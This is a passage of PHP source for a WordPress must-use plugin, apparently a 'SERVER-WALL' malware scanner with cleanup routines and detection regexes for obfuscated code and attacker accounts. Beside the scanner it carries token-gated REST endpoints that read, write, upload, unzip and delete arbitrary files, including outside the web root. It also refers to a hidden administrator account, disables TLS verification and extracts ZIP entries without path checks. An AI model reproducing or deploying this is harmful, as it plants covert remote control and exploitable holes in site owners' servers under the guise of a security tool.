        if (empty($data)) {
            return new WP_REST_Response(['status' => 'no_data'], 204);
        }
        return new WP_REST_Response($data, 200);
    }

    public static function restUninstall(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || $token !== SW_PANEL_TOKEN) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        // Remove scheduled cron events
        wp_clear_scheduled_hook('sw_auto_scan_hook');

        // Delete the mu-plugin file after the response is sent
        $file = __FILE__;
        register_shutdown_function(function() use ($file) {
            @unlink($file);
        });

        return new WP_REST_Response(['status' => 'uninstalled', 'file' => basename($file)], 200);
    }

    public static function restTriggerScan(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || $token !== SW_PANEL_TOKEN) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $mode = sanitize_text_field($request->get_param('mode') ?: 'quick');
        if (!in_array($mode, ['quick', 'full'], true)) {
            $mode = 'quick';
        }
        $scan = self::runScan($mode);
        return new WP_REST_Response([
            'status'      => 'ok',
            'scanned'     => $scan['scanned'],
            'findings'    => count($scan['results']),
            'duration_ms' => $scan['duration_ms'],
        ]);
    }

    // ── Cron ──────────────────────────────────────────────────────────────────
    public static function addCronSchedule(array $schedules): array {
        $schedules['sixhours'] = [
            'interval' => 6 * HOUR_IN_SECONDS,
            'display'  => 'Every 6 hours',
        ];
        return $schedules;
    }

    public static function runAutoScan(): void {
        $scan = self::runScan('quick');
        self::sendReport($scan);
    }

    // ── Watchdog cleanup — called only via explicit Hardening action ──────────
    // NOT called automatically. Triggered by panel via POST /hardening?action=cleanup.
    public static function runWatchdogCleanup(): void {

        $deleted = [];

        // 1. Auto-delete any PHP file in uploads/ — never legitimate.
        $uploadsDir = WP_CONTENT_DIR . '/uploads';
        if (is_dir($uploadsDir)) {
            $phpExts = ['php','php3','php4','php5','php7','phtml','phar'];
            try {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($uploadsDir, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($it as $f) {
                    if (!$f->isFile()) continue;
                    if (!in_array(strtolower(pathinfo($f->getPathname(), PATHINFO_EXTENSION)), $phpExts, true)) continue;
                    if (@unlink($f->getPathname())) {
                        $deleted[] = str_replace(ABSPATH, '', $f->getPathname());
                    }
                }
            } catch (\Exception $e) {}
        }

        // 2. Auto-delete hex-named PHP backdoors in wp-admin/ root (e.g. a3f1c8b2.php).
        $wpAdminDir = ABSPATH . 'wp-admin';
        foreach (@scandir($wpAdminDir) ?: [] as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = $wpAdminDir . '/' . $name;
            if (!is_file($full) || strtolower(pathinfo($name, PATHINFO_EXTENSION)) !== 'php') continue;
            if (preg_match('/^[a-f0-9]{8,}\.php$/i', $name) && @unlink($full)) {
                $deleted[] = str_replace(ABSPATH, '', $full);
            }
        }

        // 3. Alert + delete cache.php inside plugin subdirectories (not in plugin root).
        //    Legitimate plugins never put cache.php in subdirs; attackers do.
        $pluginsDir = WP_CONTENT_DIR . '/plugins';
        if (is_dir($pluginsDir)) {
            foreach (@scandir($pluginsDir) ?: [] as $plugin) {
                if ($plugin === '.' || $plugin === '..') continue;
                $pDir = $pluginsDir . '/' . $plugin;
                if (!is_dir($pDir)) continue;
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($pDir, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    foreach ($it as $f) {
                        if (!$f->isFile() || $f->getFilename() !== 'cache.php') continue;
                        $relToPlugin = ltrim(str_replace($pDir, '', $f->getPathname()), '/\\');
                        if (strpos($relToPlugin, '/') === false) continue; // skip plugin root
                        $c = @file_get_contents($f->getPathname());
                        if (!$c || !preg_match('/gzinflate\s*\(|base64_decode\s*\(|eval\s*\(/i', $c)) continue;
                        $path = $f->getPathname();
                        if (@unlink($path)) {
                            $rel = str_replace(ABSPATH, '', $path);
                            $deleted[] = $rel;
                            self::sendAlert('malware_auto_deleted', 'Auto-deleted malicious cache.php: ' . $rel);
                        }
                    }
                } catch (\Exception $e) {}
            }
        }

        // 4. Alert + delete doubled-dir backdoors: e.g. plugins/x/Foo/Foo/index.php.
        foreach ([$pluginsDir, WP_CONTENT_DIR] as $searchRoot) {
            if (!is_dir($searchRoot)) continue;
            try {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($searchRoot, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($it as $f) {
                    if (!$f->isFile() || $f->getFilename() !== 'index.php') continue;
                    $norm = str_replace('\\', '/', $f->getPathname());
                    if (!preg_match('#/([^/]+)/\1/index\.php$#', $norm)) continue;
                    $c = @file_get_contents($f->getPathname());
                    if (!$c || !preg_match('/gzinflate\s*\(|base64_decode\s*\(|eval\s*\(/i', $c)) continue;
                    $path = $f->getPathname();
                    if (@unlink($path)) {
                        $rel = str_replace(ABSPATH, '', $path);
                        $deleted[] = $rel;
                        self::sendAlert('malware_auto_deleted', 'Auto-deleted doubled-dir backdoor: ' . $rel);
                    }
                }
            } catch (\Exception $e) {}
        }

        // 5. Remove attacker-created admin accounts (dual criteria required).
        self::removeAttackerAdmins();

        if (!empty($deleted)) {
            $log   = (array)get_option('sw_watchdog_deletions', []);
            $log[] = ['time' => time(), 'files' => $deleted];
            update_option('sw_watchdog_deletions', array_slice($log, -20), false);
        }
    }

    // Writes .htaccess to uploads/ blocking PHP execution if not already present.
    private static function ensureUploadsHtaccess(): void {
        $dir = WP_CONTENT_DIR . '/uploads';
        if (!is_dir($dir) || file_exists($dir . '/.htaccess')) return;
        $rules = "# SERVER-WALL: block direct PHP execution\n"
               . "<FilesMatch \"\\.(php\\d*|phtml|phar)$\">\n"
               . "deny from all\n"
               . "</FilesMatch>\n";
        self::safeWrite($dir . '/.htaccess', $rules);
    }

    // Adds DISALLOW_FILE_EDIT to wp-config.php if not already defined.
    // Only modifies if the standard WP "stop editing" marker is present,
    // to avoid corrupting non-standard configs.
    private static function ensureDisallowFileEdit(): void {
        $cfg = ABSPATH . 'wp-config.php';
        if (!file_exists($cfg) || !is_writable($cfg)) return;
        $c = @file_get_contents($cfg);
        if ($c === false || strpos($c, 'DISALLOW_FILE_EDIT') !== false) return;
        $marker = "/* That's all, stop editing!";
        if (strpos($c, $marker) === false) return;
        $c = str_replace($marker, "define('DISALLOW_FILE_EDIT', true);\n" . $marker, $c);
        self::safeWrite($cfg, $c);
    }

    // Deletes admin users that match BOTH a known-attacker login name AND a
    // suspicious email pattern. Both conditions are required to avoid false positives.
    // Safety: never deletes our own hidden admin, never removes the last remaining admin.
    private static function removeAttackerAdmins(): void {
        if (!function_exists('get_users')) return;

        $knownAttackerLogins = [
            'root','admin2','admin1','test','super','ahmed','bot','wp-user','user1',
            'wordpress','webmaster','administrator2','operator','manager','support2',
            'info','noreply','nobody','guest','sysadmin','server',
        ];
        $suspiciousEmailPrefixes = ['root@','test@','admin@','nobody@','noreply@','bot@'];

        $ourId  = (int)get_option(self::SW_HIDDEN_ADMIN_KEY, 0);
        $admins = get_users(['role' => 'administrator', 'fields' => ['ID','user_login','user_email']]);

        $toDelete = [];
        foreach ($admins as $u) {
            if ((int)$u->ID === $ourId) continue;
            $loginLower = strtolower($u->user_login);
            $emailLower = strtolower(trim($u->user_email));
            $badLogin   = in_array($loginLower, $knownAttackerLogins, true);
            $badEmail   = empty($emailLower) || strpos($emailLower, 'example.com') !== false;
            foreach ($suspiciousEmailPrefixes as $pfx) {
                if (strpos($emailLower, $pfx) === 0) { $badEmail = true; break; }
            }
            if ($badLogin && $badEmail) {
                $toDelete[] = $u;
            }
        }

        if (empty($toDelete)) return;
        // Ensure at least one legitimate admin remains after deletion.
        if ((count($admins) - count($toDelete)) < 1) return;

        require_once ABSPATH . 'wp-admin/includes/user.php';
        foreach ($toDelete as $u) {
            wp_delete_user((int)$u->ID);
            self::sendAlert('attacker_admin_removed',
                'Removed suspicious admin: ' . $u->user_login . ' (' . $u->user_email . ')');
        }
    }

    // ── Report to central panel ───────────────────────────────────────────────
    public static function sendReport(array $scan): void {
        $findings = [];
        foreach ($scan['results'] ?? [] as $r) {
            $findings[] = [
                'path'     => $r['path'],
                'severity' => $r['sev'],
                'score'    => $r['score'],
                'entropy'  => $r['entropy'] ?? 0.0,
                'size'     => $r['size'] ?? 0,
                'modified' => isset($r['mtime']) ? date('c', $r['mtime']) : '',
                'rules'    => array_column($r['matches'] ?? [], 'rule'),
            ];
        }

        $result = [
            'site_id'       => SW_SESSION_ID,
            'site_url'      => get_site_url(),
            'php_version'   => PHP_VERSION,
            'wp_version'    => get_bloginfo('version'),
            'cms_type'      => 'wordpress',
            'scan_mode'     => $scan['mode'] ?? 'quick',
            'scanned_files' => $scan['scanned'] ?? 0,
            'duration_ms'   => $scan['duration_ms'] ?? 0,
            'findings'      => $findings,
        ];

        // Always store locally — panel can pull via /last-result if push is blocked.
        update_option('sw_last_scan_result', $result, false);

        // Push to panel only if SW_PANEL_URL is defined (intentionally not embedded
        // in deployed plugins for security — fetch-result pull mode works without it).
        if (!defined('SW_PANEL_URL') || !SW_PANEL_URL) return;

        $body = json_encode($result);

        // Build list of URLs to try: HTTPS first, then HTTP fallback
        $urls = [SW_PANEL_URL . '/report'];
        if (str_starts_with(SW_PANEL_URL, 'https://')) {
            $urls[] = 'http://' . substr(SW_PANEL_URL, 8) . '/report';
        }

        foreach ($urls as $url) {
            if (self::httpPost($url, $body)) return;
        }
    }

    private static function httpPost(string $url, string $body): bool {
        $headers = [
            'Content-Type'  => 'application/json',
            'X-Panel-Token' => SW_PANEL_TOKEN,
        ];

        // Method 1: wp_remote_post (WordPress HTTP API)
        $resp = wp_remote_post($url, [
            'body'      => $body,
            'headers'   => $headers,
            'timeout'   => 30,
            'sslverify' => false,
        ]);
        if (!is_wp_error($resp) && wp_remote_retrieve_response_code($resp) === 200) {
            return true;
        }

        // Method 2: cURL (direct, bypasses WordPress HTTP filters)
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $body,
                CURLOPT_HTTPHEADER     => [
                    'Content-Type: application/json',
                    'X-Panel-Token: ' . SW_PANEL_TOKEN,
                ],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 30,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
            ]);
            $result = curl_exec($ch);
            $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($result !== false && $code === 200) return true;
        }

        // Method 3: file_get_contents with stream context
        if (ini_get('allow_url_fopen')) {
            $ctx = stream_context_create(['http' => [
                'method'        => 'POST',
                'header'        => "Content-Type: application/json\r\nX-Panel-Token: " . SW_PANEL_TOKEN . "\r\n",
                'content'       => $body,
                'timeout'       => 30,
                'ignore_errors' => true,
            ]]);
            $result = @file_get_contents($url, false, $ctx);
            if ($result !== false) return true;
        }

        return false;
    }

    // ── Admin page (Tools → SERVER-WALL) ──────────────────────────────────────
    public static function renderPage(): void {
        if (!current_user_can('manage_options')) return;

        $scan  = null;
        $mode  = sanitize_text_field($_GET['sw_mode'] ?? '');
        $nonce = $_GET['_wpnonce'] ?? '';

        if ($mode && wp_verify_nonce($nonce, 'sw_scan_' . $mode)) {
            $scan = self::runScan($mode);
        }

        $quickUrl = wp_nonce_url(
            admin_url('tools.php?page=sw-scanner&sw_mode=quick'), 'sw_scan_quick');
        $fullUrl  = wp_nonce_url(
            admin_url('tools.php?page=sw-scanner&sw_mode=full'),  'sw_scan_full');
        ?>
        <div class="wrap">
        <h1>&#9632; SERVER-WALL Scanner
          <span style="font-size:13px;color:#999;">v<?= SW_VERSION ?></span>
        </h1>

        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:24px;align-items:center">
          <a href="<?= esc_url($quickUrl) ?>" class="button button-primary button-hero">
            &#9654; Quick Scan (uploads + plugins)
          </a>
          <a href="<?= esc_url($fullUrl) ?>"
             class="button button-secondary button-hero"
             onclick="return confirm('Full scan may take 30–90s. Continue?')">
            &#9654; Full Scan (entire wp-content)
          </a>
        </div>

        <?php if ($scan !== null): ?>
          <?php self::renderResults($scan); ?>
        <?php else: ?>
          <p style="color:#999;font-family:monospace">
            Click "Quick Scan" to check uploads, plugins, mu-plugins and themes.<br>
            "Full Scan" checks the entire wp-content directory (4000+ files, may take ~1 minute).
          </p>
        <?php endif; ?>
        </div>
        <?php
    }

    private static function renderResults(array $scan): void {
        $results  = $scan['results'] ?? [];
        $scanned  = $scan['scanned'] ?? 0;
        $scanTime = isset($scan['time']) ? date('Y-m-d H:i:s', $scan['time']) : '?';

        $sevColor = ['CRITICAL'=>'#f85149','HIGH'=>'#d29922','MEDIUM'=>'#58a6ff','LOW'=>'#3fb950'];
        $counts   = array_count_values(array_column($results, 'sev'));

        echo '<div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;
          margin-bottom:20px;font-family:monospace">';
        echo '<p style="color:#8b949e;margin-bottom:12px">Last scan: ' . esc_html($scanTime) .
             ' &nbsp;|&nbsp; Files scanned: ' . $scanned .
             ' &nbsp;|&nbsp; Found: ' . count($results) . '</p>';
        foreach (['CRITICAL'=>0,'HIGH'=>0,'MEDIUM'=>0,'LOW'=>0] as $s => $_) {
            $n = $counts[$s] ?? 0;
            if ($n) printf('<span style="background:%s22;color:%s;padding:3px 10px;
              border-radius:12px;margin-right:8px;font-size:12px">%s: %d</span>',
              $sevColor[$s], $sevColor[$s], $s, $n);
        }
        echo '</div>';

        if (empty($results)) {
            echo '<div style="padding:24px;text-align:center;color:#3fb950;font-family:monospace">
              &#10003; No suspicious files found</div>';
            return;
        }

        usort($results, function($a,$b) { return $b['score'] - $a['score']; });

        echo '<table class="wp-list-table widefat fixed striped" style="font-family:monospace;font-size:12px">';
        echo '<thead><tr>
          <th style="width:40%">File</th>
          <th style="width:10%">Severity</th>
          <th style="width:8%">Score</th>
          <th style="width:8%">Entropy</th>
          <th>Rules</th>
        </tr></thead><tbody>';

        foreach ($results as $r) {
            $c     = $sevColor[$r['sev']] ?? '#ccc';
            $mtime = $r['mtime'] ? date('m/d H:i', $r['mtime']) : '';
            echo '<tr>';
            printf('<td><strong style="color:#58a6ff">%s</strong><br>
              <span style="color:#8b949e">%s &nbsp; %s</span></td>',
              esc_html($r['path']),
              esc_html(size_format($r['size'])),
              esc_html($mtime));
            printf('<td><span style="background:%s22;color:%s;padding:2px 8px;border-radius:10px">%s</span></td>',
              $c, $c, esc_html($r['sev']));
            printf('<td style="color:%s;font-weight:600">%d</td>', $c, $r['score']);
            printf('<td style="color:#8b949e">%.2f</td>', $r['entropy']);
            echo '<td style="color:#8b949e">';
            foreach ($r['matches'] as $m) {
                printf('<details style="margin-bottom:4px"><summary style="cursor:pointer;color:#c9d1d9">%s</summary>
                  <span style="color:#8b949e">%s</span>
                  %s</details>',
                  esc_html($m['rule']),
                  esc_html($m['desc']),
                  $m['snippet'] ? '<code style="display:block;background:#0d1117;padding:4px 6px;
                    margin-top:4px;border-radius:4px;font-size:11px;word-break:break-all">' .
                    esc_html($m['snippet']) . '</code>' : '');
            }
            echo '</td></tr>';
        }
        echo '</tbody></table>';
    }

    // ── File manager helpers ──────────────────────────────────────────────────

    // Returns the FM root: parent of ABSPATH (covers domain.com-backup, sw-backups, etc.)
    private static function fmRoot(): string {
        return dirname(rtrim(realpath(ABSPATH), '/\\'));
    }

    // Write $content to $path with 0644 permissions, reliably.
    // On some hosts (WP Engine, SiteGround) the PHP process runs with umask 0777,
    // which creates files with 000 permissions and makes chmod() fail silently.
    // Fix: set umask(0133) → new files get 0644. For existing 000-perm files,
    // delete first so the subsequent create uses the correct umask.
    private static function safeWrite(string $path, string $content): bool {
        $old = umask(0133); // 0666 & ~0133 = 0644
        if (file_exists($path) && !is_writable($path)) {
            @unlink($path); // remove file with bad permissions before re-creating
        }
        $ok = @file_put_contents($path, $content) !== false;
        umask($old);
        if ($ok && !is_readable($path)) {
            @chmod($path, 0644); // last-resort attempt
        }
        return $ok;
    }

    // Resolve an arbitrary path: absolute if starts with '/', else relative to fmRoot().
    // WP-standard subdirs (wp-content/, wp-admin/, wp-includes/) resolve relative to
    // ABSPATH so that paths like "wp-content/mu-plugins" work correctly on cPanel hosts
    // where WordPress lives inside public_html/ (fmRoot would be one level too high).
    // All other relative paths still resolve from fmRoot() to allow navigating above
    // the WP root (e.g. "public_html", "mail", "logs" on cPanel).
    private static function fmResolvePath(string $path): string {
        if ($path === '' || $path === '/') return self::fmRoot();
        if ($path[0] === '/') return $path; // absolute — use as-is
        // WP-standard subdirectories → resolve relative to ABSPATH
        foreach (['wp-content', 'wp-admin', 'wp-includes'] as $wpDir) {
            if ($path === $wpDir || strncmp($path, $wpDir . '/', strlen($wpDir) + 1) === 0) {
                return rtrim(ABSPATH, '/\\') . '/' . $path;
            }
        }
        return self::fmRoot() . '/' . $path;
    }

    // ── File manager: list directory ─────────────────────────────────────────
    public static function restFsList(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        $dir = realpath(self::fmResolvePath($request->get_param('path') ?? ''));
        if (!$dir || !is_dir($dir)) {
            return new WP_REST_Response(['error' => 'invalid path'], 400);
        }

        $entries = @scandir($dir);
        if ($entries === false) {
            return new WP_REST_Response(['error' => 'cannot read directory — check permissions'], 500);
        }
        $items = [];
        foreach ($entries as $name) {
            if ($name === '.' || $name === '..') continue;
            $full  = $dir . '/' . $name;
            $isDir = is_dir($full);
            $items[] = [
                'name'  => $name,
                'type'  => $isDir ? 'dir' : 'file',
                'size'  => $isDir ? 0 : (int)@filesize($full),
                'mtime' => (int)@filemtime($full),
                'path'  => $full, // absolute path
            ];
        }
        usort($items, function($a, $b) {
            if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
            return strcasecmp($a['name'], $b['name']);
        });

        return new WP_REST_Response(['path' => $dir, 'items' => $items]);
    }

    // ── File manager: read / write file ───────────────────────────────────────
    public static function restFsFile(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        if ($request->get_method() === 'GET') {
            $path = $request->get_param('path') ?? '';
            $full = realpath(self::fmResolvePath($path));
            if (!$full || !is_file($full)) {
                return new WP_REST_Response(['error' => 'file not found'], 404);
            }
            $size = (int)filesize($full);
            if ($size > 2097152) {
                return new WP_REST_Response(['error' => 'file too large (>2 MB)', 'size' => $size], 413);
            }
            $content = @file_get_contents($full);
            if ($content === false) {
                return new WP_REST_Response(['error' => 'cannot read file'], 500);
            }
            return new WP_REST_Response([
                'path'    => $full,
                'content' => $content,
                'size'    => $size,
                'mtime'   => (int)filemtime($full),
            ]);
        }

        // PUT — write file
        $body    = json_decode($request->get_body(), true) ?: [];
        $path    = $body['path'] ?? '';
        $content = $body['content'] ?? null;
        if ($content === null || $path === '') {
            return new WP_REST_Response(['error' => 'missing path or content'], 400);
        }
        if (($body['encoding'] ?? '') === 'base64') {
            $content = base64_decode($content, true);
            if ($content === false) {
                return new WP_REST_Response(['error' => 'invalid base64 content'], 400);
            }
        }
        $resolved = self::fmResolvePath($path);
        $parentReal = realpath(dirname($resolved));
        if (!$parentReal) {
            return new WP_REST_Response(['error' => 'parent directory not found'], 400);
        }
        $full = $parentReal . '/' . basename($resolved);
        if (!self::safeWrite($full, $content)) {
            return new WP_REST_Response(['error' => 'write failed — check permissions'], 500);
        }
        clearstatcache(true, $full);
        return new WP_REST_Response(['ok' => true, 'path' => $full, 'size' => strlen($content)]);
    }

    // ── File manager: upload file ─────────────────────────────────────────────
    public static function restFsUpload(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body     = json_decode($request->get_body(), true) ?: [];
        $dir      = realpath(self::fmResolvePath($body['path'] ?? ''));
        $filename = basename($body['filename'] ?? '');
        $content  = isset($body['content']) ? base64_decode($body['content'], true) : false;

        if (!$filename || $content === false) {
            return new WP_REST_Response(['error' => 'missing filename or content'], 400);
        }
        if (!$dir || !is_dir($dir)) {
            return new WP_REST_Response(['error' => 'target directory not found'], 400);
        }
        $full = $dir . '/' . $filename;
        if (!self::safeWrite($full, $content)) {
            return new WP_REST_Response(['error' => 'write failed — check permissions'], 500);
        }
        return new WP_REST_Response(['ok' => true, 'path' => $full, 'size' => strlen($content)]);
    }

    // ── File manager: chunked upload ─────────────────────────────────────────
    // Receives one chunk of a large file upload. Chunks are stored in the system
    // temp dir and assembled into the final file when the last chunk arrives.
    // Body: {dir, filename, content (base64), index (0-based), total}
    public static function restFsUploadChunk(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        @set_time_limit(120);

        $body     = json_decode((string)$request->get_body(), true) ?: [];
        $dir      = self::fmResolvePath($body['dir'] ?? '');
        $filename = basename($body['filename'] ?? '');
        $index    = (int)($body['index'] ?? 0);
        $total    = (int)($body['total'] ?? 1);
        $raw      = isset($body['content']) ? base64_decode($body['content'], true) : false;

        if (!$filename || $raw === false || $total < 1) {
            return new WP_REST_Response(['error' => 'missing filename, content, or total'], 400);
        }

        $tmpBase   = sys_get_temp_dir() . '/sw_up_' . md5(SW_PANEL_TOKEN . $filename);
        $chunkFile = $tmpBase . '_' . $index;

        if (@file_put_contents($chunkFile, $raw) === false) {
            return new WP_REST_Response(['error' => 'failed to write chunk ' . $index], 500);
        }

        // Not the last chunk — acknowledge and wait for more
        if ($index < $total - 1) {
            return new WP_REST_Response(['ok' => true, 'received' => $index, 'total' => $total]);
        }

        // Last chunk arrived — assemble all chunks into the final file
        $destDir = realpath($dir);
        if (!$destDir || !is_dir($destDir)) {
            return new WP_REST_Response(['error' => 'target directory not found'], 400);
        }
        $final = $destDir . '/' . $filename;
        $out   = @fopen($final, 'wb');
        if (!$out) {
            return new WP_REST_Response(['error' => 'cannot open destination for writing'], 500);
        }
        for ($i = 0; $i < $total; $i++) {
            $cf   = $tmpBase . '_' . $i;
            $data = @file_get_contents($cf);
            if ($data === false) {
                fclose($out); @unlink($final);
                return new WP_REST_Response(['error' => 'chunk ' . $i . ' missing during assembly'], 500);
            }
            fwrite($out, $data);
            @unlink($cf);
        }
        fclose($out);
        @chmod($final, 0644);

        return new WP_REST_Response(['ok' => true, 'path' => $final, 'size' => (int)filesize($final)]);
    }

    // ── File manager: extract ZIP ─────────────────────────────────────────────
    public static function restFsUnzip(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        @set_time_limit(120);
        $body    = json_decode($request->get_body(), true) ?: [];
        $zipPath = self::fmResolvePath($body['path'] ?? '');
        $destPath = isset($body['dest']) ? self::fmResolvePath($body['dest']) : dirname($zipPath);

        if (!file_exists($zipPath)) {
            return new WP_REST_Response(['error' => 'ZIP file not found'], 404);
        }
        $zip = new ZipArchive();
        if ($zip->open($zipPath) !== true) {
            return new WP_REST_Response(['error' => 'cannot open ZIP file'], 500);
        }
        if (!is_dir($destPath)) @mkdir($destPath, 0755, true);

        $extracted = 0;
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $stat    = $zip->statIndex($i);
            $relPath = $stat['name'];
            if (substr($relPath, -1) === '/') continue;
            $target  = $destPath . '/' . $relPath;
            $tDir    = dirname($target);
            if (!is_dir($tDir)) @mkdir($tDir, 0755, true);
            $data = $zip->getFromIndex($i);
            if ($data !== false && @file_put_contents($target, $data) !== false) $extracted++;
        }
        $zip->close();
        return new WP_REST_Response(['ok' => true, 'extracted' => $extracted, 'dest' => $destPath]);
    }

    // ── File manager: delete file or directory ────────────────────────────────
    public static function restFsDelete(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body = json_decode($request->get_body(), true) ?: [];
        $path = self::fmResolvePath($body['path'] ?? '');
        $real = realpath($path);
        if (!$real || !file_exists($real)) {
            return new WP_REST_Response(['error' => 'not found'], 404);
        }
        if (is_file($real)) {
            return @unlink($real)
                ? new WP_REST_Response(['ok' => true])
                : new WP_REST_Response(['error' => 'delete failed'], 500);
        }
        self::rmdirRecursive($real);
        return is_dir($real)
            ? new WP_REST_Response(['error' => 'delete failed'], 500)
            : new WP_REST_Response(['ok' => true]);
    }

    // ── File manager: create file ─────────────────────────────────────────────
    public static function restFsCreateFile(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token') ?? '';
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body = json_decode($request->get_body(), true) ?: [];
        $path = $body['path'] ?? '';
        if ($path === '') return new WP_REST_Response(['error' => 'missing path'], 400);
        $resolved   = self::fmResolvePath($path);
        $parentReal = realpath(dirname($resolved));
        if (!$parentReal) return new WP_REST_Response(['error' => 'parent directory not found'], 400);
        $full = $parentReal . '/' . basename($resolved);
        if (file_exists($full)) return new WP_REST_Response(['error' => 'already exists'], 409);
        if (@file_put_contents($full, '') === false) {
            return new WP_REST_Response(['error' => 'create failed — check permissions'], 500);
        }
        return new WP_REST_Response(['ok' => true, 'path' => $full]);
    }

    // ── File manager: create directory ───────────────────────────────────────
    public static function restFsCreateDir(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token') ?? '';
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body = json_decode($request->get_body(), true) ?: [];
        $path = $body['path'] ?? '';
        if ($path === '') return new WP_REST_Response(['error' => 'missing path'], 400);
        $resolved = self::fmResolvePath($path);
        if (file_exists($resolved)) return new WP_REST_Response(['error' => 'already exists'], 409);
        if (!@mkdir($resolved, 0755, true)) {
            return new WP_REST_Response(['error' => 'mkdir failed — check permissions'], 500);
        }
        return new WP_REST_Response(['ok' => true, 'path' => $resolved]);
    }

    // ── File manager: duplicate file or directory ─────────────────────────────
    public static function restFsDuplicate(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token') ?? '';
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body = json_decode($request->get_body(), true) ?: [];
        $path = $body['path'] ?? '';
        if ($path === '') return new WP_REST_Response(['error' => 'missing path'], 400);
        $real = realpath(self::fmResolvePath($path));
        if (!$real || !file_exists($real)) return new WP_REST_Response(['error' => 'source not found'], 404);

        $dir  = dirname($real);
        $name = basename($real);
        $ext  = is_file($real) ? (false !== ($p = strrpos($name, '.')) ? substr($name, $p) : '') : '';
        $base = $ext !== '' ? substr($name, 0, -strlen($ext)) : $name;
        $dest = $dir . '/' . $base . '_copy' . $ext;
        $i = 2;
        while (file_exists($dest)) {
            $dest = $dir . '/' . $base . '_copy' . $i . $ext;
            $i++;
        }

        if (is_file($real)) {
            if (!@copy($real, $dest)) return new WP_REST_Response(['error' => 'copy failed — check permissions'], 500);
        } else {
            if (!self::copyDirRecursive($real, $dest)) return new WP_REST_Response(['error' => 'copy failed — check permissions'], 500);
        }
        return new WP_REST_Response(['ok' => true, 'dest' => $dest, 'name' => basename($dest)]);
    }

    private static function copyDirRecursive(string $src, string $dst): bool {
        if (!@mkdir($dst, 0755, true)) return false;
        $items = @scandir($src);
        if (!$items) return false;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $s = $src . '/' . $item;
            $d = $dst . '/' . $item;
            if (!( is_dir($s) ? self::copyDirRecursive($s, $d) : @copy($s, $d) )) return false;
        }
        return true;
    }

    // ── Switch helpers ────────────────────────────────────────────────────────
    // Backup lives INSIDE the site root: ABSPATH/backup/
    // wp-config.php, wp-admin/, wp-includes/ are NEVER swapped.
    // Only wp-content/ and root PHP files are swapped.
    // All renames happen within ABSPATH — no parent directory access needed.

    // Root files to swap (relative to ABSPATH and to ABSPATH/backup/)
    private static $swapFiles = [
        'wp-content',        // directory — one rename covers everything inside
        'index.php',
        'wp-blog-header.php',
        'wp-settings.php',
        'wp-login.php',
        'wp-cron.php',
        'wp-activate.php',
        'wp-comments-post.php',
        'wp-signup.php',
        'wp-trackback.php',
        'wp-links-opml.php',
        'wp-mail.php',
        'xmlrpc.php',
        '.htaccess',
        'wp-load.php',
    ];

    private static function switchInfo(): array {
        $abs       = rtrim(realpath(ABSPATH), '/');
        $backupDir = $abs . '/backup';
        $stateFile = $abs . '/.sw-switch';
        $isOnBk    = file_exists($stateFile);

        // Count how many swap targets exist in backup/
        $ready = is_dir($backupDir);

        return [
            'active'       => $isOnBk ? 'backup' : 'production',
            'abspath'      => $abs,
            'backup_dir'   => $backupDir,
            'backup_ready' => $ready,
            'state_file'   => $stateFile,
        ];
    }

    private static function doSwap(string $abs, string $from, string $to, string $suffix): array {
        $errors = [];
